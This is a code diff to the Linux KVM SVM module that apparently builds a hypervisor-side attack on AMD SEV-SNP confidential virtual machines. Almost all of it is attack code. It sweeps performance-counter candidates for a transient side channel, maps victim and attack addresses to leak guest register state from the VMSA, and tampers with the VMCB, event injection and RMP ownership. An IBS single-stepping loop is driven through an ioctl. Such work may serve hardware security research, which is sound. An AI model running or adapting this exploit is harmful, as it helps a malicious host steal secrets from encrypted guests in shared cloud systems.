@@ -64,7 +64,6 @@
 #include <asm/io.h>
 #include <linux/cpu.h>
 #include <asm/processor.h>
-#include <linux/psp.h>
 
 #include "mmu/tdp_mmu.h"
 #include <asm/sev.h>
@@ -4897,33 +4896,106 @@ struct pmc_candidate {
 /* * The Refined Golden Candidates (> 27 cycles) 
  * Prioritizing the PMCs that achieved 100% extraction accuracy.
  */
-static const struct pmc_candidate candidates[] = { { 0xD2, 0x24 },
-						   { 0xD2, 0x57 },
-						   { 0xD2, 0x8A } };
-#define NUM_CANDIDATES (sizeof(candidates) / sizeof(candidates[0]))
-#define NUM_CANDIDATES (sizeof(candidates) / sizeof(candidates[0]))
+static const struct pmc_candidate candidates[] = {
+	{ 0x76, 0x00 }, { 0x76, 0x01 }, { 0x76, 0x02 }, { 0x76, 0x03 },
+	{ 0x76, 0x04 }, { 0x76, 0x05 }, { 0x76, 0x06 }, { 0x76, 0x07 },
+	{ 0x76, 0x08 }, { 0x76, 0x09 }, { 0x76, 0x0A }, { 0x76, 0x0B },
+	{ 0x76, 0x0C }, { 0x76, 0x0D }, { 0x76, 0x0E }, { 0x76, 0x0F },
+	{ 0x76, 0x10 }, { 0x76, 0x11 }, { 0x76, 0x12 }, { 0x76, 0x13 },
+	{ 0x76, 0x14 }, { 0x76, 0x15 }, { 0x76, 0x16 }, { 0x76, 0x17 },
+	{ 0x76, 0x18 }, { 0x76, 0x19 }, { 0x76, 0x1A }, { 0x76, 0x1B },
+	{ 0x76, 0x1C }, { 0x76, 0x1D }, { 0x76, 0x1E }, { 0x76, 0x1F },
+	{ 0x76, 0x20 }, { 0x76, 0x21 }, { 0x76, 0x22 }, { 0x76, 0x23 },
+	{ 0x76, 0x24 }, { 0x76, 0x25 }, { 0x76, 0x26 }, { 0x76, 0x27 },
+	{ 0x76, 0x28 }, { 0x76, 0x29 }, { 0x76, 0x2A }, { 0x76, 0x2B },
+	{ 0x76, 0x2C }, { 0x76, 0x2D }, { 0x76, 0x2E }, { 0x76, 0x2F },
+	{ 0x76, 0x30 }, { 0x76, 0x31 }, { 0x76, 0x32 }, { 0x76, 0x33 },
+	{ 0x76, 0x34 }, { 0x76, 0x35 }, { 0x76, 0x36 }, { 0x76, 0x37 },
+	{ 0x76, 0x38 }, { 0x76, 0x39 }, { 0x76, 0x3A }, { 0x76, 0x3B },
+	{ 0x76, 0x3C }, { 0x76, 0x3D }, { 0x76, 0x3E }, { 0x76, 0x3F },
+	{ 0x76, 0x40 }, { 0x76, 0x41 }, { 0x76, 0x42 }, { 0x76, 0x43 },
+	{ 0x76, 0x44 }, { 0x76, 0x45 }, { 0x76, 0x46 }, { 0x76, 0x47 },
+	{ 0x76, 0x48 }, { 0x76, 0x49 }, { 0x76, 0x4A }, { 0x76, 0x4B },
+	{ 0x76, 0x4C }, { 0x76, 0x4D }, { 0x76, 0x4E }, { 0x76, 0x4F },
+	{ 0x76, 0x50 }, { 0x76, 0x51 }, { 0x76, 0x52 }, { 0x76, 0x53 },
+	{ 0x76, 0x54 }, { 0x76, 0x55 }, { 0x76, 0x56 }, { 0x76, 0x57 },
+	{ 0x76, 0x58 }, { 0x76, 0x59 }, { 0x76, 0x5A }, { 0x76, 0x5B },
+	{ 0x76, 0x5C }, { 0x76, 0x5D }, { 0x76, 0x5E }, { 0x76, 0x5F },
+	{ 0x76, 0x60 }, { 0x76, 0x61 }, { 0x76, 0x62 }, { 0x76, 0x63 },
+	{ 0x76, 0x64 }, { 0x76, 0x65 }, { 0x76, 0x66 }, { 0x76, 0x67 },
+	{ 0x76, 0x68 }, { 0x76, 0x69 }, { 0x76, 0x6A }, { 0x76, 0x6B },
+	{ 0x76, 0x6C }, { 0x76, 0x6D }, { 0x76, 0x6E }, { 0x76, 0x6F },
+	{ 0x76, 0x70 }, { 0x76, 0x71 }, { 0x76, 0x72 }, { 0x76, 0x73 },
+	{ 0x76, 0x74 }, { 0x76, 0x75 }, { 0x76, 0x76 }, { 0x76, 0x77 },
+	{ 0x76, 0x78 }, { 0x76, 0x79 }, { 0x76, 0x7A }, { 0x76, 0x7B },
+	{ 0x76, 0x7C }, { 0x76, 0x7D }, { 0x76, 0x7E }, { 0x76, 0x7F },
+	{ 0x76, 0x80 }, { 0x76, 0x81 }, { 0x76, 0x82 }, { 0x76, 0x83 },
+	{ 0x76, 0x84 }, { 0x76, 0x85 }, { 0x76, 0x86 }, { 0x76, 0x87 },
+	{ 0x76, 0x88 }, { 0x76, 0x89 }, { 0x76, 0x8A }, { 0x76, 0x8B },
+	{ 0x76, 0x8C }, { 0x76, 0x8D }, { 0x76, 0x8E }, { 0x76, 0x8F },
+	{ 0x76, 0x90 }, { 0x76, 0x91 }, { 0x76, 0x92 }, { 0x76, 0x93 },
+	{ 0x76, 0x94 }, { 0x76, 0x95 }, { 0x76, 0x96 }, { 0x76, 0x97 },
+	{ 0x76, 0x98 }, { 0x76, 0x99 }, { 0x76, 0x9A }, { 0x76, 0x9B },
+	{ 0x76, 0x9C }, { 0x76, 0x9D }, { 0x76, 0x9E }, { 0x76, 0x9F },
+	{ 0x76, 0xA0 }, { 0x76, 0xA1 }, { 0x76, 0xA2 }, { 0x76, 0xA3 },
+	{ 0x76, 0xA4 }, { 0x76, 0xA5 }, { 0x76, 0xA6 }, { 0x76, 0xA7 },
+	{ 0x76, 0xA8 }, { 0x76, 0xA9 }, { 0x76, 0xAA }, { 0x76, 0xAB },
+	{ 0x76, 0xAC }, { 0x76, 0xAD }, { 0x76, 0xAE }, { 0x76, 0xAF },
+	{ 0x76, 0xB0 }, { 0x76, 0xB1 }, { 0x76, 0xB2 }, { 0x76, 0xB3 },
+	{ 0x76, 0xB4 }, { 0x76, 0xB5 }, { 0x76, 0xB6 }, { 0x76, 0xB7 },
+	{ 0x76, 0xB8 }, { 0x76, 0xB9 }, { 0x76, 0xBA }, { 0x76, 0xBB },
+	{ 0x76, 0xBC }, { 0x76, 0xBD }, { 0x76, 0xBE }, { 0x76, 0xBF },
+	{ 0x76, 0xC0 }, { 0x76, 0xC1 }, { 0x76, 0xC2 }, { 0x76, 0xC3 },
+	{ 0x76, 0xC4 }, { 0x76, 0xC5 }, { 0x76, 0xC6 }, { 0x76, 0xC7 },
+	{ 0x76, 0xC8 }, { 0x76, 0xC9 }, { 0x76, 0xCA }, { 0x76, 0xCB },
+	{ 0x76, 0xCC }, { 0x76, 0xCD }, { 0x76, 0xCE }, { 0x76, 0xCF },
+	{ 0x76, 0xD0 }, { 0x76, 0xD1 }, { 0x76, 0xD2 }, { 0x76, 0xD3 },
+	{ 0x76, 0xD4 }, { 0x76, 0xD5 }, { 0x76, 0xD6 }, { 0x76, 0xD7 },
+	{ 0x76, 0xD8 }, { 0x76, 0xD9 }, { 0x76, 0xDA }, { 0x76, 0xDB },
+	{ 0x76, 0xDC }, { 0x76, 0xDD }, { 0x76, 0xDE }, { 0x76, 0xDF },
+	{ 0x76, 0xE0 }, { 0x76, 0xE1 }, { 0x76, 0xE2 }, { 0x76, 0xE3 },
+	{ 0x76, 0xE4 }, { 0x76, 0xE5 }, { 0x76, 0xE6 }, { 0x76, 0xE7 },
+	{ 0x76, 0xE8 }, { 0x76, 0xE9 }, { 0x76, 0xEA }, { 0x76, 0xEB },
+	{ 0x76, 0xEC }, { 0x76, 0xED }, { 0x76, 0xEE }, { 0x76, 0xEF },
+	{ 0x76, 0xF0 }, { 0x76, 0xF1 }, { 0x76, 0xF2 }, { 0x76, 0xF3 },
+	{ 0x76, 0xF4 }, { 0x76, 0xF5 }, { 0x76, 0xF6 }, { 0x76, 0xF7 },
+	{ 0x76, 0xF8 }, { 0x76, 0xF9 }, { 0x76, 0xFA }, { 0x76, 0xFB },
+	{ 0x76, 0xFC }, { 0x76, 0xFD }, { 0x76, 0xFE }
+};
+#define NUM_CANDIDATES 5
 
 /* ------------------------------------------------------------------ */
 /* Configuration (Fill in your target VAs here)                       */
 /* ------------------------------------------------------------------ */
-#define BASE_VA 0xFF00000000000000ull
+#define BASE_VA 0xFFFF000000000000ull
 
-#define PAGE_OFFSET_CACHED 0x1F8 //vmsa->rax
+static inline uint64_t canonicalize_48(uint64_t va)
+{
+    va &= 0x0000ffffffffffffULL;
+
+    if (va & (1ULL << 47))
+        va |= 0xffff000000000000ULL;
+
+    return va;
+}
+
+//#define PAGE_OFFSET_CACHED 0x1F8 //vmsa->rax
 static uint64_t PHYS_BASE = 0;
 static uint64_t VICTIM_VA = 0;
 static uint64_t ATTACK_VA = 0;
 static uint64_t SECRET_VALUE = 0;
+static uint64_t PAGE_OFFSET_CACHED = 0;
 
 static bool spec_ctrl_intercepted_vmrun = false;
 static struct vcpu_svm *svm_vmrun = NULL;
 struct svm_cpu_data *sd_vmrun = NULL;
 
-#define CONTROL_VA (BASE_VA + 0x0000700000001000ULL)
-#define CHASE_VA (BASE_VA + 0x0000700000002000ULL)
+#define CONTROL_VA (BASE_VA + 0x0000880000001000ULL)
+#define CHASE_VA (BASE_VA + 0x0000880000002000ULL)
 
 #define MAP_SIZE 4096
 #define N_SECRET_BITS 64
-#define SWEEP_PROBES 500
+#define SWEEP_PROBES 20
 
 /* ------------------------------------------------------------------ */
 /* User-Provided Page Table Manipulation Snippet                      */
@@ -5019,6 +5091,12 @@ static noinline __aligned(4096) uint64_t
 	asm volatile("invlpg (%0)" ::"r"((uint8_t *)((u64)target & PAGE_MASK))
 		     : "memory");
 
+	svm_vmrun->vmcb->control.event_inj =	(1U << 31) | 
+											(5U << 28) | 	// invalid type
+											(1U << 11) |
+											0x400; 
+
+	svm_vmrun->vmcb->control.event_inj_err = 0;
 
 	if (victim) {
 		__asm__ volatile("movq (%0),%%rax" ::"r"(victim)
@@ -5272,7 +5350,7 @@ static int kthread_tsa_main(void *data)
 	*chase1 = (uint64_t)chase2;
 	*chase2 = (uint64_t)chase1;
 
-	pr_info("[+] COMMENCING ITERATION OVER %ld CANDIDATE PMCs\n",
+	pr_info("[+] COMMENCING ITERATION OVER %d CANDIDATE PMCs\n",
 		NUM_CANDIDATES);
 	pr_info("--------------------------------------------------------------\n");
 
@@ -5347,7 +5425,13 @@ static u64 __maybe_unused rmpupdate_pre_guest(u64 paddr, u32 asid){
 	return ret;
 }
 
-static u64 rmpupdate_pre_hv(u64 paddr)
+static inline u64 __maybe_unused set_c_bit(u64 val)
+{
+    return val | (1ULL << 51) ;
+}
+
+
+static u64 __maybe_unused rmpupdate_pre_hv(u64 paddr)
 {
 	struct rmp_state state = {0};
 	u64 ret;
@@ -5367,14 +5451,84 @@ static u64 rmpupdate_pre_hv(u64 paddr)
 	return ret;
 }
 
-static inline u64 __maybe_unused set_c_bit(u64 val)
+static noinstr void __maybe_unused svm_vcpu_enter_exit(struct kvm_vcpu *vcpu,
+					bool spec_ctrl_intercepted)
 {
-    return val | (1ULL << 51) ;
-}
+	struct svm_cpu_data *sd = per_cpu_ptr(&svm_data, vcpu->cpu);
+	struct vcpu_svm *svm = to_svm(vcpu);
+	(void)sd;
+	ibs_apic_exit(NULL);
+	guest_state_enter_irqoff();
 
-static inline u64 __maybe_unused clear_c_bit(u64 val)
-{
-	return val & ~(1ULL << 51) ;
+	/*
+	 * Set RFLAGS.IF prior to VMRUN, as the host's RFLAGS.IF at the time of
+	 * VMRUN controls whether or not physical IRQs are masked (KVM always
+	 * runs with V_INTR_MASKING_MASK).  Toggle RFLAGS.IF here to avoid the
+	 * temptation to do STI+VMRUN+CLI, as AMD CPUs bleed the STI shadow
+	 * into guest state if delivery of an event during VMRUN triggers a
+	 * #VMEXIT, and the guest_state transitions already tell lockdep that
+	 * IRQs are being enabled/disabled.  Note!  GIF=0 for the entirety of
+	 * this path, so IRQs aren't actually unmasked while running host code.
+	 */
+	raw_local_irq_enable();
+
+	amd_clear_divider();
+
+	if (!leak_rax) {
+		goto run_vm;
+	}
+
+	void* vmcb_save = kmalloc(0x1000, GFP_KERNEL);
+	memcpy(vmcb_save, svm->current_vmcb->ptr, 0x1000);
+
+	leak_rax = 0;
+	pr_info("TSA-L1 Module Loaded.\n");
+
+	spec_ctrl_intercepted_vmrun = spec_ctrl_intercepted;
+	svm_vmrun = svm;
+	sd_vmrun = sd;
+
+	uint64_t mask = (1ULL << 13) | (1ULL << 26) | // u1
+			(1ULL << 14) | (1ULL << 25); // u2
+
+
+	u64 spte;
+	u64 *sptep;
+	rcu_read_lock();
+	sptep = kvm_tdp_mmu_fast_pf_get_last_sptep(vcpu, guest_pa >> PAGE_SHIFT, &spte);
+	rcu_read_unlock();
+	PHYS_BASE = spte & 0x0000FFFFFFFFF000ULL;
+	svm->vmcb->control.vmsa_pa = PHYS_BASE;
+
+	SECRET_VALUE = 0xABABABABABABABAB;
+
+	int offsets[] = {0xc0, 0x380, 0x3c0};
+	for(int j = 0; j < 3; j++) {
+		for(int i = 0x0; i < 64; i += 8) {
+		
+		PAGE_OFFSET_CACHED = i +  offsets[j];
+		pr_info("[*] Testing with PAGE_OFFSET_CACHED = 0x%llx\n", PAGE_OFFSET_CACHED);
+		VICTIM_VA = canonicalize_48(BASE_VA + PHYS_BASE);
+		ATTACK_VA = canonicalize_48((BASE_VA + PHYS_BASE) ^ mask);
+
+		pr_info("[*] Leaking Physical Base: 0x%llx\n", PHYS_BASE);
+		pr_info("[*] Mapped Victim VA: 0x%llx\n", VICTIM_VA);
+		pr_info("[*] Mapped Attack VA: 0x%llx\n", ATTACK_VA);
+
+		kthread_tsa_main(NULL);
+		}
+	}
+
+
+	memcpy(svm->current_vmcb->ptr, vmcb_save, 0x1000);
+
+run_vm:
+	__svm_sev_es_vcpu_run(svm, spec_ctrl_intercepted,
+			      sev_es_host_save_area(sd));
+
+	raw_local_irq_disable();
+
+	guest_state_exit_irqoff();
 }
 
 
@@ -5405,33 +5559,11 @@ static noinstr void __maybe_unused svm_vcpu_enter_exit_tsa(struct kvm_vcpu *vcpu
 		goto run_vm;
 	}
 
-	function_address = (u64) __svm_sev_es_vcpu_run;
-	recover_address = function_address + 0x4f;
-
-
 	void* vmcb_save = kmalloc(0x1000, GFP_KERNEL);
 	memcpy(vmcb_save, svm->current_vmcb->ptr, 0x1000);
 
-	//immediately cause #GP
-	svm->vmcb->control.event_inj = 
-						(1U << 31) | 	// valid
-				       	(3U << 8)  | 	// type = exception
-				       	(1U << 11) | 	// error-code valid
-				       	13; 			// vector = #GP
-
-	svm->vmcb->control.event_inj_err = 0;
-
-	int ret = rmpupdate_pre_guest(svm->current_vmcb->pa, 0x1);
-	if (ret) {
-		pr_err("RMPUPDATE failed with error code: %d\n", ret);
-		goto run_vm;
-	}else {
-		pr_info("RMPUPDATE succeeded, VMCB not hypervisor owned\n");
-	}
-
 	leak_rax = 0;
 	pr_info("TSA-L1 Module Loaded.\n");
-
 
 	spec_ctrl_intercepted_vmrun = spec_ctrl_intercepted;
 	svm_vmrun = svm;
@@ -5443,21 +5575,14 @@ static noinstr void __maybe_unused svm_vcpu_enter_exit_tsa(struct kvm_vcpu *vcpu
 	PHYS_BASE = svm->vmcb->control.vmsa_pa;
 	SECRET_VALUE = 0xDEADBEEFDEADBEEF;
 
-	VICTIM_VA = BASE_VA + PHYS_BASE;
-	ATTACK_VA = (BASE_VA + PHYS_BASE) ^ mask;
+	VICTIM_VA = canonicalize_48(BASE_VA + PHYS_BASE);
+	ATTACK_VA = canonicalize_48((BASE_VA + PHYS_BASE) ^ mask);
 
 	pr_info("[*] Leaking Physical Base: 0x%llx\n", PHYS_BASE);
 	pr_info("[*] Mapped Victim VA: 0x%llx\n", VICTIM_VA);
 	pr_info("[*] Mapped Attack VA: 0x%llx\n", ATTACK_VA);
 
 	kthread_tsa_main(NULL);
-
-	ret = rmpupdate_pre_hv(svm->current_vmcb->pa);
-	if (ret) {
-		pr_err("RMPUPDATE to hypervisor-owned failed with error code: %d\n", ret);
-	} else {
-		pr_info("RMPUPDATE to hypervisor-owned succeeded\n");
-	}
 
 	memcpy(svm->current_vmcb->ptr, vmcb_save, 0x1000);
 
@@ -5578,115 +5703,13 @@ static void __maybe_unused read_ibs_ctrl(u64 uop_cnt) {
     __write_msr(BP_IBSTGT_RIP, 0);
 }
 
-struct psp_sev_cmd_move {
-	u64 gctx_paddr;
-	u32 page_size:1;
-	u32 reserved:31;
-	u32 reserved1;
-	u64 src_paddr;
-	u64 dst_paddr;
-} __packed;
-
-static int __maybe_unused psp_move_page(struct kvm *kvm, u64 hpa_src, u64 hpa_dst)
-{
-	struct kvm_sev_info *sev = &to_kvm_svm(kvm)->sev_info;
-	struct psp_sev_cmd_move data = {0};
-	u32 error = 0;
-	int ret;
-
-	if (!sev || !sev->snp_context)
-		return -EINVAL;
-
-	if (!IS_ALIGNED(hpa_src, PAGE_SIZE) || !IS_ALIGNED(hpa_dst, PAGE_SIZE))
-		return -EINVAL;
-
-	data.gctx_paddr = __psp_pa(sev->snp_context);
-	data.page_size = 0; /* 4 KiB */
-	data.src_paddr = hpa_src;
-	data.dst_paddr = hpa_dst;
-
-	pr_info("SNP_PAGE_MOVE gctx=%llx src=%llx dst=%llx asid=%u\n",
-		data.gctx_paddr, data.src_paddr, data.dst_paddr, sev->asid);
-
-	ret = sev_do_cmd(SEV_CMD_SNP_PAGE_MOVE, &data, &error);
-
-	pr_info("SNP_PAGE_MOVE ret=%d fw_error=0x%x\n", ret, error);
-	return ret;
-}
-
-static int __maybe_unused __sev_issue_cmd(int fd, int id, void *data, int *error)
-{
-	CLASS(fd, f)(fd);
-
-	if (fd_empty(f))
-		return -EBADF;
-
-	return sev_issue_cmd_external_user(fd_file(f), id, data, error);
-}
-
-static int __maybe_unused sev_issue_cmd(struct kvm *kvm, int id, void *data, int *error)
-{
-	struct kvm_sev_info *sev = to_kvm_sev_info(kvm);
-
-	return __sev_issue_cmd(sev->fd, id, data, error);
-}
-
-static unsigned int __maybe_unused sev_get_asid(struct kvm *kvm)
-{
-	return to_kvm_sev_info(kvm)->asid;
-}
-
-static int __maybe_unused snp_bind_asid(struct kvm *kvm, int *error)
-{
-	struct kvm_sev_info *sev = to_kvm_sev_info(kvm);
-	struct sev_data_snp_activate data = {0};
-
-	data.gctx_paddr = __psp_pa(sev->snp_context);
-	data.asid = sev_get_asid(kvm);
-	return sev_issue_cmd(kvm, SEV_CMD_SNP_ACTIVATE, &data, error);
-}
 
 
-static int __maybe_unused make_vmsa(struct kvm *kvm, u64 vmsa_pa, int *error)
-{
-	struct kvm_sev_info *sev = to_kvm_sev_info(kvm);
-	struct sev_data_snp_launch_update data = {};
-
-	data.gctx_paddr = __psp_pa(sev->snp_context);
-	data.page_type = SNP_PAGE_TYPE_VMSA;
-	data.address = vmsa_pa;
-	return sev_issue_cmd(kvm, SEV_CMD_SNP_LAUNCH_UPDATE, &data, error);
-}
-
-
-struct user_space_args {
-	u32 asid;
-	u64 vmsa_pa;
-	u8 fail;
-	u8 leak_rax;
-	u32 cpu;
-	u64 vmcb_pa;
-};
-
-static struct user_space_args user_args;
-
-static inline u64 set_asid_bits(u64 val, u8 asid)
-{
-    /* Clear bits 46–53 */
-    val &= ~(0xFFULL << 46);
-
-    /* Set new ASID (only lower 8 bits used) */
-    val |= ((u64)(asid & 0xFF) << 46);
-
-    // val |= (1ULL << 51);
-    return val;
-}
-
-static noinstr void __maybe_unused svm_vcpu_enter_exit(struct kvm_vcpu *vcpu, bool spec_ctrl_intercepted)
+static noinstr void __maybe_unused svm_vcpu_enter_exit_ibs(struct kvm_vcpu *vcpu, bool spec_ctrl_intercepted)
 {
 	struct svm_cpu_data *sd = per_cpu_ptr(&svm_data, vcpu->cpu);
 	struct vcpu_svm *svm = to_svm(vcpu);
-	struct kvm_sev_info *sev = &to_kvm_svm(vcpu->kvm)->sev_info;
+	(void)sd;
 	ibs_apic_exit(NULL);
 	guest_state_enter_irqoff();
 
@@ -5698,97 +5721,43 @@ static noinstr void __maybe_unused svm_vcpu_enter_exit(struct kvm_vcpu *vcpu, bo
 		goto run_vm;
 	}
 
-	if (svm->current_vmcb->pa != user_args.vmcb_pa) {
-		goto exit;
-	}
-
-	function_address = (u64) __svm_sev_es_vcpu_run;
-	recover_address = function_address + 0x4f;
-
-	// void* victim_vmcb = kmalloc(0x1000, GFP_KERNEL);
-	// map_physical_to_virtual(user_args.vmcb_pa, (u64)victim_vmcb, 0);
-
-	// void* victim_vmcb_copy = kmalloc(0x1000, GFP_KERNEL);
-	// memcpy(victim_vmcb_copy, victim_vmcb, 0x1000);
-
-	void* vmcb_copy = kmalloc(0x1000, GFP_KERNEL);
-	u64 vmsa_copy = svm->vmcb->control.vmsa_pa;
-	// u64 original_vmcb_pa = svm->current_vmcb->pa;
-	u32 old_asid = sev->asid;
-	(void)old_asid;
-	memcpy(vmcb_copy, svm->current_vmcb->ptr, 0x1000);
-
-	/*
-	3b0: SEV_FEATURES
-	0ca: VMPL
-	3c8: VIRTUAL_TOM
-	*/
-
-	// u64 spte;
-	// u64 *sptep;
-	// rcu_read_lock();
-	// sptep = kvm_tdp_mmu_fast_pf_get_last_sptep(vcpu, user_args.vmsa_pa >> PAGE_SHIFT, &spte);
-	// rcu_read_unlock();
-	// PHYS_BASE = spte & 0x0000FFFFFFFFF000ULL;
-
-	// svm->vmcb->control.vmsa_pa = PHYS_BASE;
-	// int error;
-	// int ret = make_vmsa(vcpu->kvm, PHYS_BASE, &error);
-	// if (ret) {
-	// 	pr_err("Failed to create VMSA with RMPUPDATE, ret = %d, error = 0x%x\n", ret, error);
-	// 	goto run_vm;
-	// } else {
-	// 	pr_info("Successfully created VMSA with RMPUPDATE\n");
-	// }
-
-
-	if (user_args.fail)
-	{
-		sev->asid = user_args.asid;
-		svm->vmcb->control.asid = sev->asid;
-		svm->vmcb->control.vmsa_pa = user_args.vmsa_pa;
-
-		// memcpy(victim_vmcb, svm->current_vmcb->ptr, 0x1000);
-		// svm->current_vmcb->pa = user_args.vmcb_pa;
-	}
-	
-
-	// vmcb_va->control.asid = sev->asid;
-	// vmcb_va->control.vmsa_pa = user_args.vmsa_pa;
-
-
-	// if(user_args.fail){
-	// 	pr_info("Injecting #UD to cause VMRUN failure\n");
-	// 	svm->vmcb->control.event_inj =	(1U << 31) | 
-	// 								(5U << 28) | 	// invalid type
-	// 								(1U << 11) |
-	// 								0x400; 
-
-	// 	svm->vmcb->control.event_inj_err = 0;
-	// }
-
-	// void* new_vmsa = kmalloc(0x1000, GFP_KERNEL);
-
-	// int ret = rmpupdate_pre_guest(virt_to_phys(new_vmsa), sev->asid + 3);
-	// if (ret) {
-	// 	pr_err("RMPUPDATE for new VMSA failed with error code: %d\n", ret);
-	// 	kfree(new_vmsa);
-	// 	goto run_vm;
-	// } else {
-	// 	pr_info("RMPUPDATE for new VMSA succeeded\n");
-	// }
-	// svm->vmcb->control.vmsa_pa = virt_to_phys(new_vmsa);
-
+	leak_rax = 0;
+	void* vmcb_save = kmalloc(0x1000, GFP_KERNEL);
+	memcpy(vmcb_save, svm->current_vmcb->ptr, 0x1000);
 
 repeat:
 	if(ibs_uop_counter  == 0){
 		pr_info("VMCB PA 0x%lx",svm->current_vmcb->pa);
-		pr_info("Original VMSA PA 0x%llx", vmsa_copy);
-		pr_info("Fake VMSA PA 0x%llx",svm->vmcb->control.vmsa_pa);
-		pr_info("ASID %u", sev->asid);
-
+		pr_info("Befor VMSA PA 0x%llx",svm->vmcb->control.vmsa_pa);
+		pr_info("reciving VMSA PA 0x%llx", guest_pa);
 	}
 		
+
+		// u64 spte;
+		// u64 *sptep;
+		// rcu_read_lock();
+		// sptep = kvm_tdp_mmu_fast_pf_get_last_sptep(vcpu, guest_pa >> PAGE_SHIFT, &spte);
+		// rcu_read_unlock();
+		// PHYS_BASE = spte & 0x0000FFFFFFFFF000ULL;
+
+		// // if(ibs_uop_counter  == 0){
+		// // 	int ret = rmpupdate_pre_hv(PHYS_BASE);
+		// // 	if (ret) {
+		// // 		pr_info("RMPUPDATE failed with error code: %d\n", ret);
+		// // 	}else {
+		// // 		pr_info("RMPUPDATE succeeded for PA: 0x%llx\n", PHYS_BASE);
+		// // 	}
+		// // }
+		
+		// svm->vmcb->control.vmsa_pa = PHYS_BASE;
+
+			svm->vmcb->control.event_inj =	(1U << 31) | 
+									(5U << 28) | 	// invalid type
+									(1U << 11) |
+									0x400; 
+
+		svm->vmcb->control.event_inj_err = 0;
+
 		u64 instruction_value = ibs_uop_counter;
 		if(ibs_uop_counter <= MAX_INSTRUCTION_COUNT) {
 			write_ibs_ctrl(instruction_value);
@@ -5802,7 +5771,6 @@ repeat:
 
 		__svm_sev_es_vcpu_run(svm, spec_ctrl_intercepted,
 			      sev_es_host_save_area(sd));
-		
 
 		if(ibs_uop_counter <= MAX_INSTRUCTION_COUNT) {
 			READ_ONCE(((u8*)svm)[1]);
@@ -5820,18 +5788,14 @@ repeat:
 		{
 			goto repeat;
 		}
-	
-	// svm->current_vmcb->pa = original_vmcb_pa;
-	// memcpy(victim_vmcb, victim_vmcb_copy, 0x1000);
 
-	memcpy(svm->current_vmcb->ptr, vmcb_copy, 0x1000);
-	sev->asid = old_asid;
-	leak_rax = 0;
+	//memcpy(svm->current_vmcb->ptr, vmcb_save, 0x1000);
+
 run_vm:
 	__svm_sev_es_vcpu_run(svm, spec_ctrl_intercepted,
 			      sev_es_host_save_area(sd));
 	
-exit:
+
 	raw_local_irq_disable();
 	guest_state_exit_irqoff();
 }
@@ -7095,8 +7059,6 @@ static void __svm_exit(void)
 	kvm_x86_vendor_exit();
 }
 
-
-
 #define DEVICE_NAME "svm_ibs_dev"
 #define FUZZ_IOC_GET_STATE _IOR('a', 'c', cpu_state_t)
 #define FUZZ_IOC_SET_STATE _IOW('a', 'd', cpu_state_t)
@@ -7108,7 +7070,6 @@ static void __svm_exit(void)
 #define FUZZ_IOC_SET_GLOBAL_FUZZ_STATE _IOW('a', 'j', fuzzer_state_snapshot_t)
 #define FUZZ_IOC_GET_GLOBAL_FUZZ_STATE _IOR('a', 'k', fuzzer_state_snapshot_t)
 #define FUZZ_IOC_ACK_SET _IOW('a', 'l', uint64_t)
-#define FUZZ_IOC_SET_ARGS _IOW('a', 'm', struct user_space_args)
 
 
 static long fuzz_ioctl(struct file *file, unsigned int cmd, unsigned long arg)
@@ -7189,14 +7150,6 @@ static long fuzz_ioctl(struct file *file, unsigned int cmd, unsigned long arg)
 
 		return 0;
 		set_ack_event(ack_value);
-		return 0;
-
-	case FUZZ_IOC_SET_ARGS:
-	
-		if (copy_from_user(&user_args, (void __user *)arg, sizeof(struct user_space_args)))
-			return -EFAULT;
-
-		leak_rax = user_args.leak_rax;
 		return 0;
     default:
         return -EINVAL;
